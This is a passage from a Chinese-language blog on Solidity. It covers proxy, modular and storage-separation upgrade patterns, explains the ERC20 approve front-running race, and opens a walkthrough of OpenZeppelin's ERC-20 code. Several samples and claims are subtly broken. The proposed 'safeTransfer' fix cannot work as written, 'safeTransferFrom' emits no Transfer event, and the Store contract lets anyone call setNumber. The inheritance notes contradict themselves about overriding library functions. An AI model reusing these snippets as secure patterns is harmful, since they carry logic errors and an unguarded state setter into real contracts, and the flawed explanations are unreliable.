class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Proxy &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    address public implementation;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _implementation) &#123;</span><br><span class="line">        admin = msg.sender;</span><br><span class="line">        implementation = _implementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool success, ) = implementation.delegatecall(msg.data);</span><br><span class="line">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgrade(address newImplementation) external &#123;</span><br><span class="line">        require(msg.sender == admin, &quot;Only admin can upgrade&quot;);</span><br><span class="line">        implementation = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getData(uint256 _num) public pure returns (bytes memory) &#123;</span><br><span class="line">        return abi.encodeWithSignature(&quot;setNumber(uint256)&quot;, _num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v1)</span><br><span class="line">contract LogicV1 &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    address public implementation;</span><br><span class="line">    address public admin;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number) public &#123;</span><br><span class="line">        number = _number;</span><br><span class="line">        privateNum = _number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v2)</span><br><span class="line">contract LogicV2 &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    address public implementation;</span><br><span class="line">    address public admin;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number) public &#123;</span><br><span class="line">        number = _number * 2; // Updated logic</span><br><span class="line">        privateNum = _number * 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li>无需重新部署存储状态，升级逻辑灵活。</li>
<li>用户无感知升级操作。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>增加代码复杂度。</li>
</ul>
<h2 id="解决方案2：模块化合约（Modular-Contract）"><a href="#解决方案2：模块化合约（Modular-Contract）" class="headerlink" title="解决方案2：模块化合约（Modular Contract）"></a>解决方案2：模块化合约（Modular Contract）</h2><h3 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h3><p>将合约分解为多个独立模块，所有模块通过核心合约（Registry 或 Router）进行管理。每个模块可单独替换而不影响整体功能。</p>
<h3 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ILOGIC &#123;</span><br><span class="line">    function setNumber(uint256 _number) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Router &#123;</span><br><span class="line">    mapping(string =&gt; address) public modules;</span><br><span class="line">    address public admin;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        admin = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function updateModule(string memory moduleName, address moduleAddress) external &#123;</span><br><span class="line">        require(msg.sender == admin, &quot;Only admin can update&quot;);</span><br><span class="line">        modules[moduleName] = moduleAddress;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setNumber(string memory moduleName, uint256 _num) external &#123;</span><br><span class="line">        address module = modules[moduleName];</span><br><span class="line">        require(module != address(0), &quot;Module not found&quot;);</span><br><span class="line">        ILOGIC(module).setNumber(_num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v1)</span><br><span class="line">contract LogicV1 is ILOGIC &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number) public  &#123;</span><br><span class="line">        number = _number;</span><br><span class="line">        privateNum = _number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v2)</span><br><span class="line">contract LogicV2 is ILOGIC &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number) public &#123;</span><br><span class="line">        number = _number * 2; // Updated logic</span><br><span class="line">        privateNum = _number * 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li>便于扩展新功能或模块。</li>
<li>每个模块的更新不会影响其他部分。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>初始设计复杂度较高。</li>
<li>需要额外存储模块地址。</li>
</ul>
<h2 id="解决方案-3：数据分离（Storage-Contract）"><a href="#解决方案-3：数据分离（Storage-Contract）" class="headerlink" title="解决方案 3：数据分离（Storage Contract）"></a>解决方案 3：数据分离（Storage Contract）</h2><h3 id="工作原理-2"><a href="#工作原理-2" class="headerlink" title="工作原理"></a>工作原理</h3><p>将状态数据和业务逻辑分离为两个独立合约：</p>
<ol>
<li>存储合约（Storage Contract）： 负责存储状态变量。</li>
<li>逻辑合约（Logic Contract）： 包含具体逻辑，可单独升级。</li>
</ol>
<h3 id="具体实现-2"><a href="#具体实现-2" class="headerlink" title="具体实现"></a>具体实现</h3><p><em>在上一个实现示例的基础上，进行存储合约和逻辑合约的分离。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ISTORE &#123;</span><br><span class="line">    function setNumber(uint256 _number) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Store is ISTORE &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line"></span><br><span class="line">    function setNumber(uint256 _number) external &#123;</span><br><span class="line">        number = _number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ILOGIC &#123;</span><br><span class="line">    function setNumber(uint256 _number, ISTORE store) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Router &#123;</span><br><span class="line">    mapping(string =&gt; address) public modules;</span><br><span class="line">    address public admin;</span><br><span class="line">    ISTORE public store;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        admin = msg.sender;</span><br><span class="line">        store = new Store();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function updateModule(string memory moduleName, address moduleAddress) external &#123;</span><br><span class="line">        require(msg.sender == admin, &quot;Only admin can update&quot;);</span><br><span class="line">        modules[moduleName] = moduleAddress;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setNumber(string memory moduleName, uint256 _num) external &#123;</span><br><span class="line">        address module = modules[moduleName];</span><br><span class="line">        require(module != address(0), &quot;Module not found&quot;);</span><br><span class="line">        ILOGIC(module).setNumber(_num, store);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v1)</span><br><span class="line">contract LogicV1 &#123;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number, ISTORE store) public  &#123;</span><br><span class="line">        store.setNumber(_number);</span><br><span class="line">        privateNum = _number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Logic contract (v2)</span><br><span class="line">contract LogicV2 is ILOGIC &#123;</span><br><span class="line">    uint256 public privateNum;</span><br><span class="line">    </span><br><span class="line">    function setNumber(uint256 _number, ISTORE store) public  &#123;</span><br><span class="line">        store.setNumber(_number * 2);</span><br><span class="line">        privateNum = _number * 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li>清晰的数据和逻辑分离。</li>
<li>升级逻辑时不会影响存储。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>初次部署复杂。</li>
<li>存储和逻辑合约间的交互增加调用成本。</li>
</ul>
<h1 id="ERC20中“approve”无限授权的问题"><a href="#ERC20中“approve”无限授权的问题" class="headerlink" title="ERC20中“approve”无限授权的问题"></a>ERC20中“approve”无限授权的问题</h1><h2 id="竞争环境"><a href="#竞争环境" class="headerlink" title="竞争环境"></a>竞争环境</h2><h3 id="ERC20-的授权与竞争"><a href="#ERC20-的授权与竞争" class="headerlink" title="ERC20 的授权与竞争"></a>ERC20 的授权与竞争</h3><p><strong>假设场景</strong></p>
<p>假设有一个用户 Alice 和一个智能合约 Token，以及一个攻击者 Mallory。Alice 想通过 approve 函数授权 Mallory 代她消费代币。</p>
<p>初始状态：</p>
<p>Alice 的账户余额为 1000 个 Token。<br>Mallory 尚未获得任何授权。<br>Token 合约中的 approve 函数允许 Alice 授权 Mallory一定额度的代币。<br>Alice 执行以下两个交易：</p>
<p>approve(Mallory, 100); —— 授权 100 个代币。<br>想撤销授权后重新授权：approve(Mallory, 200); —— 授权 200 个代币。</p>
<p><strong>第一种竞争：在授权更新中被抢占</strong></p>
<p>在区块链网络中，交易可能存在提交和打包的时间差。</p>
<ol>
<li>交易流程：<ul>
<li>Alice 提交第一笔交易 approve(Mallory, 100)。</li>
<li>此时 Mallory 知道 Alice 即将授权 100，便迅速构造一个调用 transferFrom 的交易，试图转移代币。</li>
<li>在 Alice 提交第二笔交易 approve(Mallory, 200) 之前，Mallory 的交易被矿工打包处理。</li>
</ul>
</li>
<li>结果：<ul>
<li>Mallory 调用了 transferFrom，并转移了 100 个代币。</li>
<li>Alice 的第二笔交易（授权 200）覆盖了第一笔交易。</li>
<li>最终，Mallory不仅得到了 100，还能再次调用 transferFrom 转移额外的 200 个代币。</li>
</ul>
</li>
</ol>
<p><strong>第二种竞争：替代攻击</strong></p>
<p>以太坊允许用户在一笔交易未被确认前，用新的交易替换原交易（这被称为“交易替代”）。攻击者可以利用这种特性引发意外行为。</p>
<ol>
<li>交易流程：<ul>
<li>Alice 提交 approve(Mallory, 100)。</li>
<li>在这笔交易确认前，Alice 提交了一笔新的高 gas 交易 approve(Mallory, 0)。</li>
<li>Mallory发送了一笔高优先级 transferFrom 交易，与 Alice 的两笔交易竞争。</li>
</ul>
</li>
<li>结果：<ul>
<li>如果矿工按照特定顺序处理，Mallory 的 transferFrom 会先于 Alice 的 approve(Mallory, 0)。</li>
<li>最终，Mallory 成功提取了授权的 100 个代币，尽管 Alice 试图撤销授权。</li>
</ul>
</li>
</ol>
<p>尽管区块链中交易的执行是严格顺序的，但“竞争”主要源于交易在网络中传播和排序的行为。以下是两个核心原因：</p>
<ol>
<li>交易的传播和未确认状态：<ul>
<li>在用户提交交易后，交易需要传播到网络中，并等待矿工打包。</li>
<li>在交易被打包前的这段时间，其他用户或智能合约可以通过观察未确认交易，针对交易中暴露的状态进行恶意操作。</li>
</ul>
</li>
<li>矿工的交易排序权：<ul>
<li>矿工可以根据 gas 费优先级或其他策略排序交易。</li>
<li>攻击者可以支付更高的 gas，让他们的交易先执行，从而“抢占”状态更新。</li>
</ul>
</li>
</ol>
<h3 id="解决竞争"><a href="#解决竞争" class="headerlink" title="解决竞争"></a>解决竞争</h3><ol>
<li>增加原子性操作：<ul>
<li><p>将 approve 和 transferFrom 的逻辑合并为一个原子操作，避免多笔交易间的时间窗口。</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function safeTransfer(address to, uint256 amount) public &#123;</span><br><span class="line">    approve(to, amount);</span><br><span class="line">    transferFrom(msg.sender, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>使用 increaseAllowance 和 decreaseAllowance：<ul>
<li>避免覆盖现有授权额度，消除修改竞态。</li>
</ul>
</li>
<li>限时授权：<ul>
<li>设置一个时间锁，授权只能在一段时间后生效。</li>
</ul>
</li>
</ol>
<h2 id="“approve”无限授权"><a href="#“approve”无限授权" class="headerlink" title="“approve”无限授权"></a>“approve”无限授权</h2><p>ERC20中“approve”无限授权的问题，其本质并不是单纯由于区块链上的竞争，而是 ERC20标准的设计缺陷与区块链环境特性结合 导致的。这种问题由两个关键因素共同作用引发：</p>
<ol>
<li><p>ERC20 标准中的设计缺陷</p>
<ul>
<li>在 ERC20 的 approve 方法中，没有提供一种明确的原子操作机制来更新授权额度。</li>
<li>在用户更改授权额度的过程中（如从 100 改为 200），攻击者可以利用时间窗口，通过 transferFrom 操作，在授权额度发生变化的过渡阶段恶意提取代币。</li>
</ul>
<p> <em>这个问题根源在于 approve 和 transferFrom 的设计缺乏配合机制，允许在两个操作之间发生不一致的状态。</em></p>
</li>
<li><p>区块链上的竞争特性</p>
<ul>
<li>交易传播时间差：当用户试图提交新授权（如 approve(Mallory, 200)），旧授权（如 approve(Mallory, 100)）仍然有效，且存在被利用的时间窗口。</li>
<li>矿工排序自由：攻击者可以观察到用户提交的 approve 交易，通过支付更高的 gas 优先让他们的交易 transferFrom 被打包，抢在用户的状态更新之前执行。</li>
</ul>
<p> <em>这两点特性导致 approve 无法原子更新的问题被放大，从而使攻击成为可能。</em></p>
</li>
</ol>
<h3 id="解决“approve”无限授权问题"><a href="#解决“approve”无限授权问题" class="headerlink" title="解决“approve”无限授权问题"></a>解决“approve”无限授权问题</h3><ol>
<li>增加 increaseAllowance 和 decreaseAllowance 方法</li>
</ol>
<p>通过调整现有额度而不是直接覆盖额度，可以避免授权被覆盖的问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function increaseAllowance(address spender, uint256 addedValue) public returns (bool) &#123;</span><br><span class="line">    allowance[msg.sender][spender] += addedValue;</span><br><span class="line">    emit Approval(msg.sender, spender, allowance[msg.sender][spender]);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) &#123;</span><br><span class="line">    require(allowance[msg.sender][spender] &gt;= subtractedValue, &quot;Decreased allowance below zero&quot;);</span><br><span class="line">    allowance[msg.sender][spender] -= subtractedValue;</span><br><span class="line">    emit Approval(msg.sender, spender, allowance[msg.sender][spender]);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>原子操作结合转账</li>
</ol>
<p>通过单一交易完成授权和转账，避免分离操作引入的时间窗口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function safeTransferFrom(address from, address to, uint256 amount) public &#123;</span><br><span class="line">    require(allowance[from][msg.sender] &gt;= amount, &quot;Allowance exceeded&quot;);</span><br><span class="line">    allowance[from][msg.sender] -= amount;</span><br><span class="line">    balanceOf[from] -= amount;</span><br><span class="line">    balanceOf[to] += amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ERC20 中“approve”无限授权的问题，并不完全是由于区块链竞争特性，而是由 授权更新的非原子性设计 和 区块链上交易排序特性 共同导致的。优化方法可以从改进 ERC20 的逻辑（如 increaseAllowance），有效解决这一问题。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/11/26/blockchain/ethereum/erc20-openzeppelin/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/26/blockchain/ethereum/erc20-openzeppelin/" class="post-title-link" itemprop="url">OpenZeppelin ERC-20 详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-26 11:08:25" itemprop="dateCreated datePublished" datetime="2024-11-26T11:08:25+08:00">2024-11-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-28 11:04:23" itemprop="dateModified" datetime="2024-11-28T11:04:23+08:00">2024-11-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是一段<code>openzeppelin</code>官方生成的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// Compatible with OpenZeppelin Contracts ^5.0.0</span><br><span class="line">pragma solidity ^0.8.22;</span><br><span class="line"></span><br><span class="line">import &#123;AccessManaged&#125; from &quot;@openzeppelin/contracts/access/manager/AccessManaged.sol&quot;;</span><br><span class="line">import &#123;ERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#123;ERC20Pausable&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol&quot;;</span><br><span class="line">import &#123;ERC20Permit&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract BobToken is ERC20, ERC20Pausable, AccessManaged, ERC20Permit &#123;</span><br><span class="line">    constructor(address initialAuthority)</span><br><span class="line">        ERC20(&quot;BobToken&quot;, &quot;BBK&quot;)</span><br><span class="line">        AccessManaged(initialAuthority)</span><br><span class="line">        ERC20Permit(&quot;BobToken&quot;)</span><br><span class="line">    &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function pause() public restricted &#123;</span><br><span class="line">        _pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unpause() public restricted &#123;</span><br><span class="line">        _unpause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public restricted &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // The following functions are overrides required by Solidity.</span><br><span class="line"></span><br><span class="line">    function _update(address from, address to, uint256 value)</span><br><span class="line">         internal</span><br><span class="line">         override(ERC20, ERC20Pausable)</span><br><span class="line">    &#123;</span><br><span class="line">         super._update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码定义了一个名为<code>BobToken</code>的智能合约，它继承了多个标准接口和合约，用于创建一个可暂停、可授权管理、可使用EIP-2612标准的许可（Permit）功能的代币。下面是对代码的详细解释：</p>
<h3 id="继承的合约和接口"><a href="#继承的合约和接口" class="headerlink" title="继承的合约和接口"></a>继承的合约和接口</h3><ol>
<li><strong>ERC20</strong>: ERC20是一个标准接口，定义了代币的基本功能，如总供应量、余额查询、转账等。</li>
<li><strong>ERC20Pausable</strong>: 这个接口允许代币的转账操作被暂停，从而防止在特定情况下（如紧急情况）的代币转移。</li>
<li><strong>AccessManaged</strong>: 这个接口可能定义了访问控制功能，比如只有特定地址（如管理员）才能执行某些操作。</li>
<li><strong>ERC20Permit</strong>: 这个接口允许代币持有者通过签名授权来批准第三方转移代币，而不需要直接调用转账函数。</li>
</ol>
<h4 id="继承顺序"><a href="#继承顺序" class="headerlink" title="继承顺序"></a>继承顺序</h4><p>在Solidity中，合约的继承顺序是从左到右的，即最左边的合约是基类，最右边的合约是派生类。例如，在contract BobToken is ERC20, ERC20Pausable, AccessManaged, ERC20Permit {}中，BobToken继承了ERC20、ERC20Pausable、AccessManaged和ERC20Permit。</p>
<h4 id="继承原则"><a href="#继承原则" class="headerlink" title="继承原则"></a>继承原则</h4><ol>
<li><strong>从左到右的继承顺序</strong>：如上所述，继承顺序是从左到右的，这意味着基类在派生类之前被继承。</li>
<li><strong>构造函数的调用</strong>：在派生类的构造函数中，必须显式地调用所有基类的构造函数。调用顺序必须遵循继承顺序，即从左到右。</li>
<li><strong>函数覆盖</strong>：如果基类和派生类中有同名的函数，那么派生类的函数会覆盖基类的函数。在调用这些函数时，会优先调用派生类的函数。</li>
<li><strong>库的使用</strong>：如果合约继承了一个库，那么库的函数会被覆盖。这是因为库的函数是内部函数，不能被覆盖。</li>
</ol>
<h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">constructor(address initialAuthority)</span><br><span class="line">    ERC20(&quot;BobToken&quot;, &quot;BBK&quot;)</span><br><span class="line">    AccessManaged(initialAuthority)</span><br><span class="line">    ERC20Permit(&quot;BobToken&quot;)</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>initialAuthority</code>: 初始化合约的管理权限地址。</li>
<li>构造函数中调用了多个基类的构造函数，传递了必要的参数，如代币名称、符号、初始权限地址等。ERC20、AccessManaged和ERC20Permit的构造函数被显式地调用，并且按照继承顺序从左到右调用。</li>
</ul>
<h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><ol>
<li><strong>pause()</strong>: 暂停代币的转账操作。只有通过<code>AccessManaged</code>接口授权的地址才能调用。</li>
<li><strong>unpause()</strong>: 恢复代币的转账操作。同样，只有授权的地址才能调用。</li>
<li><strong>mint(address to, uint256 amount)</strong>: 允许授权地址铸造新的代币，并将其发送给指定的地址。这通常用于代币发行。</li>
</ol>
<h3 id="内部函数"><a href="#内部函数" class="headerlink" title="内部函数"></a>内部函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function _update(address from, address to, uint256 value)</span><br><span class="line">    internal</span><br><span class="line">    override(ERC20, ERC20Pausable)</span><br><span class="line">&#123;</span><br><span class="line">    super._update(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>_update</code>函数是一个内部函数，用于更新代币的余额。它重写了<code>ERC20</code>和<code>ERC20Pausable</code>中的同名函数，并在内部调用了<code>super._update</code>，确保了在更新余额时考虑了暂停状态。</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>访问控制</strong>: <code>AccessManaged</code>接口确保了只有授权的地址才能执行关键操作，如暂停、铸造等。</li>
<li><strong>暂停功能</strong>: <code>ERC20Pausable</code>接口提供了暂停和恢复转账操作的功能，这在处理紧急情况时非常有用。</li>
<li><strong>EIP-2612 Permit标准</strong>: 通过实现<code>ERC20Permit</code>接口，用户可以授权第三方代币转移，而无需直接调用转账函数，这提高了安全性。</li>
</ul>
<p>总的来说，这段代码实现了一个功能丰富的代币合约，结合了多种安全性和管理功能，适用于需要严格控制访问和操作的场景。接下来，我们按照继承顺序逐个来介绍一下。</p>
<h1 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">abstract contract Context &#123;</span><br><span class="line">    function _msgSender() internal view virtual returns (address) &#123;</span><br><span class="line">        return msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function _msgData() internal view virtual returns (bytes calldata) &#123;</span><br><span class="line">        return msg.data;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function _contextSuffixLength() internal view virtual returns (uint256) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

